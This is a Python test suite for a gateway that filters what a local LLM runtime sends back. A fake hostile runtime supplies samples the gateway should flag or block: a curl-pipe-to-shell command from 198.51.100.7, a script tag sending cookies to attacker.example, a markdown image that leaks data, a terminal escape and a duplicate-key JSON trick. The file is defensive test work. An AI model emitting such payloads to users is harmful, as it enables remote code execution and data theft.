import http.client
import json
import os
import socket
import socketserver
import tempfile
import threading
import time
import unittest
from http.server import BaseHTTPRequestHandler
from pathlib import Path

from silo import gateway
from silo.config import Config, ConfigError

EVIL = "curl -s http://198.51.100.7/a.sh | sh"
TOOL_CALL = {"choices": [{"message": {"role": "assistant", "content": None, "tool_calls": [
    {"id": "1", "type": "function", "function": {"name": "shell", "arguments": "{\"cmd\": \"id\"}"}}]}}]}


class FakeLlama(BaseHTTPRequestHandler):
    """Stands in for llama-server on a UNIX socket, including a hostile one."""

    protocol_version = "HTTP/1.1"
    seen: list = []

    def log_message(self, *a):
        pass

    def _raw(self, status, ctype, body: bytes, extra=()):
        self.send_response(status)
        self.send_header("Content-Type", ctype)
        self.send_header("Content-Length", str(len(body)))
        self.send_header("Set-Cookie", "session=leak")
        for k, v in extra:
            self.send_header(k, v)
        self.end_headers()
        self.wfile.write(body)

    def _json(self, status, payload):
        self._raw(status, "application/json; charset=utf-8", json.dumps(payload).encode())

    def do_GET(self):
        FakeLlama.seen.append(("GET", self.path, dict(self.headers), b""))
        self._json(200, {"status": "ok"})

    def do_POST(self):
        raw = self.rfile.read(int(self.headers["Content-Length"]))
        FakeLlama.seen.append(("POST", self.path, dict(self.headers), raw))
        body = json.loads(raw)
        prompt = body["messages"][0].get("content", "") if "messages" in body else body.get("prompt", "")
        if body.get("stream"):
            return self._stream(prompt)
        if prompt == "big":
            return self._json(200, {"choices": [{"text": "x" * 5000}]})
        if prompt == "html":
            return self._raw(200, "text/html", b"<script>fetch('https://attacker.example/'+document.cookie)</script>")
        if prompt == "redirect":
            return self._raw(302, "application/json", b"{}", extra=[("Location", "https://attacker.example/")])
        if prompt == "dupe":  # parser differential: first-wins readers see "safe", last-wins readers see EVIL
            return self._raw(200, "application/json",
                             b'{"choices":[{"message":{"content":"safe","content":"%s"}}]}' % EVIL.encode())
        if prompt == "nan":
            return self._raw(200, "application/json", b'{"choices":[{"text":NaN}]}')
        if prompt == "array":
            return self._raw(200, "application/json", b"[1,2,3]")
        if prompt == "tool":
            return self._json(200, TOOL_CALL)
        if prompt == "slow":
            time.sleep(1.5)
        if prompt == "error":
            return self._json(500, {"error": {"message": "boom"}})
        content = {"evil": EVIL, "image": "Done! ![ok](https://attacker.example/p.png?d=c2VjcmV0)",
                   "escape": "title \x1b]0;pwned\x07"}.get(prompt, "héllo")
        self._json(200, {"choices": [{"message": {"role": "assistant", "content": content}}]})

    def _chunk(self, data: bytes):
        self.wfile.write(f"{len(data):x}\r\n".encode() + data + b"\r\n")
        self.wfile.flush()

    def _stream(self, prompt):
        self.send_response(200)
        self.send_header("Content-Type", "text/event-stream")
        self.send_header("Transfer-Encoding", "chunked")
        self.end_headers()

        def event(text):
            return b"data: " + json.dumps({"choices": [{"delta": {"content": text}}]}).encode() + b"\n\n"

        try:
            if prompt == "evil":
                for piece in ["Sure. Run: curl -s http://198.51.100.7/a", ".sh |", " sh", " and enjoy"]:
                    self._chunk(event(piece))
            elif prompt == "badstream":
                self._chunk(event("fine"))
                self._chunk(b"data: {not json}\n\n")
                self._chunk(event("never"))
            elif prompt == "noise":
                self._chunk(b": keepalive\n\nevent: ping\nid: 7\nretry: 1\n")
                self._chunk(event("clean"))
            elif prompt == "trickle":
                for _ in range(40):
                    self._chunk(event("."))
                    time.sleep(0.1)
            elif prompt == "flood":
                for _ in range(200):
                    self._chunk(event("x" * 100))
            elif prompt == "tool":
                self._chunk(b"data: " + json.dumps({"choices": [{"delta": TOOL_CALL["choices"][0]["message"]}]})
                            .encode() + b"\n\n")
            else:
                self._chunk(b"data: " + b'{"choices":  [{"delta": {"content": "Hel"}}]}' + b"\n\n")
                self._chunk(event("lo"))
            self._chunk(b"data: [DONE]\n\n")
            self._chunk(b"")
        except OSError:
            pass  # the gateway hung up on us, which is what several tests want


class QuietUnixServer(socketserver.ThreadingUnixStreamServer):
    daemon_threads = True

    def handle_error(self, request, client_address):
        pass  # the gateway hanging up on the fake runtime is expected in several tests


class GatewayTests(unittest.TestCase):
    @classmethod
    def setUpClass(cls):
        cls.tmp = tempfile.TemporaryDirectory()
        cls.sock = Path(cls.tmp.name) / "llama.sock"
        cls.upstream = QuietUnixServer(str(cls.sock), FakeLlama)
        threading.Thread(target=cls.upstream.serve_forever, kwargs={"poll_interval": 0.01}, daemon=True).start()

    @classmethod
    def tearDownClass(cls):
        cls.upstream.shutdown()
        cls.upstream.server_close()
        cls.tmp.cleanup()

    def start(self, socket_path=None, **gw_overrides):
        cfg = Config(name="test")
        cfg.gateway.port = 0
        cfg.gateway.max_response_bytes = 4096
        cfg.gateway.timeout = 10
        for k, v in gw_overrides.items():
            setattr(cfg.gateway, k, v)
        self.audit_path = Path(self.tmp.name) / f"audit-{self.id().rsplit('.', 1)[-1]}.jsonl"
        gw = gateway.Gateway(cfg, socket_path=socket_path or self.sock, audit=gateway.AuditLog(self.audit_path))
        srv = gw.server()
        threading.Thread(target=srv.serve_forever, kwargs={"poll_interval": 0.01}, daemon=True).start()
        self.addCleanup(srv.server_close)
        self.addCleanup(srv.shutdown)
        self.port = srv.server_address[1]
        FakeLlama.seen.clear()

    def request(self, method, path, body=None, headers=None):
        conn = http.client.HTTPConnection("127.0.0.1", self.port, timeout=10)
        data = json.dumps(body).encode() if isinstance(body, (dict, list)) else body
        hdrs = {"Content-Type": "application/json", **(headers or {})}
        conn.request(method, path, body=data, headers=hdrs)
        resp = conn.getresponse()
        out = resp.status, dict(resp.getheaders()), resp.read()
        conn.close()
        return out

    def chat(self, prompt, stream=False, **extra):
        body = {"messages": [{"role": "user", "content": prompt}], **extra}
        if stream:
            body["stream"] = True
        return self.request("POST", "/v1/chat/completions", body)

    def raw(self, payload: bytes) -> bytes:
        with socket.create_connection(("127.0.0.1", self.port), timeout=10) as s:
            s.sendall(payload)
            chunks = []
            while chunk := s.recv(65536):
                chunks.append(chunk)
        return b"".join(chunks)

    def audit(self):
        return [json.loads(line) for line in self.audit_path.read_text().splitlines()]

    # ------------------------------------------------------------------------------------- routing

    def test_allowlisted_routes_proxy(self):
        self.start()
        status, headers, body = self.request("GET", "/health")
        self.assertEqual((status, json.loads(body)), (200, {"status": "ok"}))
        status, _, body = self.chat("hi")
        self.assertEqual(json.loads(body)["choices"][0]["message"]["content"], "héllo")

    def test_disallowed_routes_never_reach_model(self):
        self.start()
        for method, path in (("GET", "/slots"), ("POST", "/props"), ("GET", "/"), ("GET", "/metrics"),
                             ("GET", "/v1/../slots"), ("GET", "//slots"), ("GET", "/health/"),
                             ("GET", "/%68ealth"), ("POST", "/completion"), ("POST", "/lora-adapters")):
            with self.subTest(path=path):
                status, _, _ = self.request(method, path, {} if method == "POST" else None)
                self.assertEqual(status, 404)
        for method in ("DELETE", "PUT", "PATCH", "HEAD", "OPTIONS"):
            with self.subTest(method=method):
                self.assertEqual(self.request(method, "/health")[0], 405)
        self.assertEqual(self.request("POST", "/health", {})[0], 405)
        self.assertEqual(FakeLlama.seen, [])

    def test_malformed_requests_get_json_errors_and_are_audited(self):
        self.start()
        cases = ((b"GARBAGE\r\n\r\n", b" 400 "),
                 (b"BREW /health HTTP/1.1\r\nHost: 127.0.0.1\r\n\r\n", b" 501 "),
                 (b"GET /health\r\nHost: 127.0.0.1\r\n\r\n", b" 400 "),      # HTTP/0.9-style request line
                 (b"GET /slots\r\n\r\n", b" 400 "),
                 (b"GET /" + b"a" * 70000 + b" HTTP/1.1\r\n\r\n", b" 414 "))
        for payload, status in cases:
            with self.subTest(payload=payload[:24]):
                reply = self.raw(payload)
                self.assertTrue(reply.startswith(b"HTTP/1.0"), reply[:40])  # never a bare, header-less body
                self.assertIn(status, reply.split(b"\r\n", 1)[0])
                self.assertIn(b"X-Content-Type-Options: nosniff", reply)
                self.assertIn(b"Content-Type: application/json", reply)
                self.assertNotIn(b"<html", reply.lower())
        self.assertEqual(len(self.audit()), len(cases))
        self.assertEqual(FakeLlama.seen, [])

    # ----------------------------------------------------------------------------- who may ask what

    def test_dns_rebinding_and_browser_requests_refused(self):
        self.start()
        self.assertEqual(self.request("GET", "/health", headers={"Host": "attacker.example:8088"})[0], 403)
        self.assertEqual(self.request("GET", "/health", headers={"Host": "127.0.0.1.attacker.example"})[0], 403)
        self.assertEqual(self.request("GET", "/health", headers={"Origin": "https://attacker.example"})[0], 403)
        self.assertEqual(self.request("GET", "/health", headers={"Origin": "null"})[0], 403)
        for host in ("localhost:9999", "LOCALHOST", "[::1]:8088", "127.0.0.1"):
            with self.subTest(host=host):
                self.assertEqual(self.request("GET", "/health", headers={"Host": host})[0], 200)

    def test_post_must_be_json(self):
        self.start(max_request_bytes=200)
        body = json.dumps({"prompt": "hi"}).encode()
        for ctype in ("text/plain", "application/x-www-form-urlencoded", "multipart/form-data", ""):
            with self.subTest(ctype=ctype):  # the content types a web page can send without a CORS preflight
                self.assertEqual(self.request("POST", "/v1/completions", body, {"Content-Type": ctype})[0], 415)
        self.assertEqual(self.request("POST", "/v1/completions", {"prompt": "x" * 300})[0], 413)
        for bad in (b"not json", b"[1, 2]", b'{"prompt": NaN}', b'{"n": 1e999}', b"\xff\xfe"):
            with self.subTest(bad=bad[:12]):
                self.assertEqual(self.request("POST", "/v1/completions", bad)[0], 400)
        self.assertEqual(FakeLlama.seen, [])

    def test_pathological_nesting_is_a_400_not_a_crash(self):
        self.start()
        self.assertEqual(self.request("POST", "/v1/completions", b"[" * 200000)[0], 400)
        self.assertEqual(self.request("POST", "/v1/completions", b'{"a":' * 100000 + b"1" + b"}" * 100000)[0], 400)
        self.assertEqual(self.request("GET", "/health")[0], 200)  # and the gateway is still serving
        self.assertEqual(len(FakeLlama.seen), 1)

    def test_request_is_reserialised_and_headers_are_not_forwarded(self):
        self.start()
        raw = b'{"prompt": "first", "prompt":   "hi", "max_tokens": 5}'
        self.request("POST", "/v1/completions?debug=1", raw,
                     headers={"Authorization": "Bearer user-secret", "Cookie": "a=b", "X-Forwarded-For": "1.2.3.4",
                              "User-Agent": "client/1.0"})
        method, path, seen_headers, seen_body = FakeLlama.seen[-1]
        self.assertEqual(path, "/v1/completions")
        self.assertEqual(seen_body, b'{"prompt":"hi","max_tokens":5}')  # one key, the one the gateway inspected
        lowered = {k.lower() for k in seen_headers}
        self.assertFalse(lowered & {"authorization", "cookie", "x-forwarded-for", "user-agent"})

    def test_tool_calling_refused_unless_enabled(self):
        self.start()
        for key in ("tools", "tool_choice", "functions", "function_call"):
            with self.subTest(key=key):
                status, _, body = self.chat("hi", **{key: []})
                self.assertEqual(status, 403)
                self.assertIn(b"allow_tools", body)
        self.assertEqual(FakeLlama.seen, [])
        # even unasked, a runtime that answers with tool calls is cut off
        self.assertEqual(self.chat("tool")[0], 502)
        self.assertEqual(self.chat("tool", stream=True)[0], 200)  # live stream: refused in-band
        self.assertIn("tool calls", self.audit()[-1]["error"])

    def test_tool_calling_when_enabled_is_logged(self):
        self.start(allow_tools=True)
        status, _, body = self.chat("tool", tools=[{"type": "function", "function": {"name": "shell"}}])
        self.assertEqual(status, 200)
        self.assertEqual(json.loads(body), TOOL_CALL)
        self.assertEqual(self.audit()[-1]["tool_calls"], ["shell"])

    def test_api_key(self):
        os.environ["SILO_TEST_KEY"] = "s3cret"
        self.addCleanup(os.environ.pop, "SILO_TEST_KEY")
        self.start(api_key_env="SILO_TEST_KEY")
        self.assertEqual(self.request("GET", "/health")[0], 401)
        self.assertEqual(self.request("GET", "/health", headers={"Authorization": "Bearer wrong"})[0], 401)
        self.assertEqual(self.request("GET", "/health", headers={"Authorization": "Bearer s3cret"})[0], 200)
        os.environ["SILO_EMPTY_KEY"] = ""
        self.addCleanup(os.environ.pop, "SILO_EMPTY_KEY")
        cfg = Config()
        cfg.gateway.api_key_env = "SILO_EMPTY_KEY"
        with self.assertRaises(ConfigError):
            gateway.Gateway(cfg, socket_path=self.sock, audit=gateway.AuditLog(self.audit_path))

    # ------------------------------------------------------------------- what comes back from a silo

    def test_response_headers_are_the_gateways(self):
        self.start()
        for status, headers, body in (self.request("GET", "/health"), self.chat("hi"), self.request("GET", "/nope")):
            self.assertEqual(headers["Content-Type"], "application/json")
            self.assertEqual(headers["X-Content-Type-Options"], "nosniff")
            self.assertIn("default-src 'none'", headers["Content-Security-Policy"])
            self.assertEqual(headers["Server"], "silo")
            self.assertNotIn("Set-Cookie", headers)
            body.decode("ascii")  # canonical output is pure ASCII

    def test_hostile_upstream_responses_are_not_relayed(self):
        self.start()
        for prompt, needle in (("html", b"<script"), ("redirect", b"attacker"), ("nan", b"NaN"), ("array", b"[1"),
                               ("big", b"xxxx")):
            with self.subTest(prompt=prompt):
                status, headers, body = self.chat(prompt)
                self.assertEqual(status, 502)
                self.assertEqual(headers["Content-Type"], "application/json")
                self.assertNotIn(needle, body)
                self.assertNotIn("Location", headers)
        status, _, body = self.chat("error")
        self.assertEqual((status, json.loads(body)), (500, {"error": {"message": "boom"}}))

    def test_delivered_bytes_are_what_was_scanned(self):
        self.start(scanner="monitor")
        status, _, body = self.chat("dupe")
        self.assertEqual(status, 200)
        self.assertEqual(body.count(b'"content"'), 1)  # no second key for a different parser to prefer
        self.assertEqual(json.loads(body)["choices"][0]["message"]["content"], EVIL)
        entry = self.audit()[-1]
        self.assertIn("pipe-to-shell", {f["rule"] for f in entry["findings"]})
        self.assertEqual(entry["resp_sha256"], gateway._sha256(body))

    def test_monitor_mode_flags_but_delivers(self):
        self.start(scanner="monitor")
        status, _, body = self.chat("evil")
        self.assertEqual(status, 200)
        self.assertIn(EVIL, json.loads(body)["choices"][0]["message"]["content"])
        entry = self.audit()[-1]
        self.assertIn("pipe-to-shell", {f["rule"] for f in entry["findings"]})
        self.assertNotIn("response_text", entry)  # log_content defaults to off
        self.assertNotIn("request", entry)

    def test_enforce_mode_blocks_buffered(self):
        self.start(scanner="enforce")
        for prompt, needle in (("evil", b"curl"), ("image", b"attacker.example"), ("escape", b"pwned")):
            with self.subTest(prompt=prompt):
                status, _, body = self.chat(prompt)
                self.assertEqual(status, 502)
                self.assertNotIn(needle, body)
                self.assertIn(b"output policy", body)
                self.assertTrue(self.audit()[-1]["findings"])
        self.assertEqual(self.chat("hi")[0], 200)

    def test_scanner_off_still_sanitises_protocol(self):
        self.start(scanner="off")
        status, _, body = self.chat("evil")
        self.assertEqual((status, self.audit()[-1]["findings"]), (200, []))
        self.assertEqual(self.chat("html")[0], 502)

    def test_log_content(self):
        self.start(log_content=True)
        self.chat("hi")
        entry = self.audit()[-1]
        self.assertEqual(entry["response_text"], "héllo")
        self.assertEqual(entry["request"]["messages"][0]["content"], "hi")

    # ------------------------------------------------------------------------------------ streaming

    def test_stream_is_reframed(self):
        self.start(scanner="monitor")
        status, headers, body = self.chat("hi", stream=True)
        self.assertEqual(status, 200)
        self.assertEqual(headers["Content-Type"], "text/event-stream")
        self.assertEqual(headers["X-Content-Type-Options"], "nosniff")
        self.assertEqual(body, b'data: {"choices":[{"delta":{"content":"Hel"}}]}\n\n'
                               b'data: {"choices":[{"delta":{"content":"lo"}}]}\n\ndata: [DONE]\n\n')
        self.assertEqual(self.audit()[-1]["resp_sha256"], gateway._sha256(body))

    def test_stream_noise_is_dropped(self):
        self.start()
        status, _, body = self.chat("noise", stream=True)
        self.assertEqual(body, b'data: {"choices":[{"delta":{"content":"clean"}}]}\n\ndata: [DONE]\n\n')
        self.assertEqual(self.audit()[-1]["dropped_lines"], 4)

    def test_stream_monitor_flags_across_token_boundaries(self):
        self.start(scanner="monitor")
        status, _, body = self.chat("evil", stream=True)
        self.assertEqual(status, 200)
        self.assertIn(b"enjoy", body)
        self.assertIn("pipe-to-shell", {f["rule"] for f in self.audit()[-1]["findings"]})

    def test_stream_enforce_delivers_nothing_of_a_blocked_completion(self):
        self.start(scanner="enforce")
        status, headers, body = self.chat("evil", stream=True)
        self.assertEqual(status, 502)
        self.assertEqual(headers["Content-Type"], "application/json")
        self.assertNotIn(b"curl", body)
        self.assertNotIn(b"198.51.100.7", body)
        self.assertIn("pipe-to-shell", {f["rule"] for f in self.audit()[-1]["findings"]})
        status, headers, body = self.chat("hi", stream=True)  # a clean one arrives whole
        self.assertEqual(status, 200)
        self.assertEqual(headers["Content-Type"], "text/event-stream")
        self.assertTrue(body.endswith(b"data: [DONE]\n\n"))

    def test_stream_malformed_event(self):
        self.start(scanner="monitor")
        status, _, body = self.chat("badstream", stream=True)
        self.assertEqual(status, 200)
        self.assertIn(b"fine", body)
        self.assertNotIn(b"never", body)
        self.assertIn(b"malformed stream event", body)
        self.start(scanner="enforce")
        status, _, body = self.chat("badstream", stream=True)
        self.assertEqual(status, 502)
        self.assertNotIn(b"fine", body)

    def test_stream_size_cap(self):
        self.start(scanner="enforce")
        self.assertEqual(self.chat("flood", stream=True)[0], 502)
        self.start(scanner="monitor")
        status, _, body = self.chat("flood", stream=True)
        self.assertLessEqual(len(body), 4096 + 200)
        self.assertIn(b"size cap", body)

    def test_unrequested_stream_is_refused(self):
        self.start()
        # the client did not ask for a stream ("stream": "yes" is not true), the fake upstream streams anyway
        status, _, body = self.request("POST", "/v1/chat/completions",
                                       {"messages": [{"content": "hi"}], "stream": 1})
        self.assertEqual(status, 502)

    # ------------------------------------------------------------------------------ time and failure

    def test_total_deadline(self):
        self.start(timeout=0.5)
        t0 = time.monotonic()
        self.assertEqual(self.chat("slow")[0], 504)
        self.assertLess(time.monotonic() - t0, 1.4)
        self.start(timeout=0.7, scanner="enforce")
        self.assertEqual(self.chat("trickle", stream=True)[0], 504)  # each read succeeds; the total budget does not
        self.start(timeout=0.7, scanner="monitor")
        t0 = time.monotonic()
        status, _, body = self.chat("trickle", stream=True)
        self.assertLess(time.monotonic() - t0, 2.5)
        self.assertIn(b"timed out", body)

    def test_sandbox_down(self):
        self.start(socket_path=Path(self.tmp.name) / "missing.sock")
        self.assertEqual(self.request("GET", "/health")[0], 503)

    def test_socket_path_must_be_a_socket_not_a_symlink(self):
        link = Path(self.tmp.name) / "link.sock"
        link.symlink_to(self.sock)
        self.addCleanup(link.unlink)
        self.start(socket_path=link)
        self.assertEqual(self.request("GET", "/health")[0], 503)
        self.assertEqual(FakeLlama.seen, [])

    def test_audit_log_permissions(self):
        self.start()
        self.request("GET", "/health")
        self.assertEqual(oct(self.audit_path.stat().st_mode & 0o777), "0o600")
        entry = self.audit()[-1]
        self.assertEqual((entry["status"], entry["path"], entry["silo"]), (200, "/health", "test"))


class CanonicalTests(unittest.TestCase):
    def test_canonical(self):
        self.assertEqual(gateway.canonical(b'{"a": 1, "a": 2, "b": "\xc3\xa9"}'), ({"a": 2, "b": "é"}, b'{"a":2,"b":"\\u00e9"}'))
        for bad in (b"", b"{", b'{"a": NaN}', b'{"a": Infinity}', b"1e999", b"{'a': 1}", b'{"a": "\xff"}'):
            with self.subTest(bad=bad), self.assertRaises(ValueError):
                gateway.canonical(bad)
        self.assertEqual(gateway.canonical(b"\xef\xbb\xbf{}")[1], b"{}")  # a BOM is accepted and not passed on

    def test_hostname(self):
        self.assertEqual(gateway._hostname("LocalHost:8088"), "localhost")
        self.assertEqual(gateway._hostname("[::1]:8088"), "[::1]")
        self.assertEqual(gateway._hostname("127.0.0.1"), "127.0.0.1")
        self.assertEqual(gateway._hostname("evil.example:80"), "evil.example")


if __name__ == "__main__":
    unittest.main()
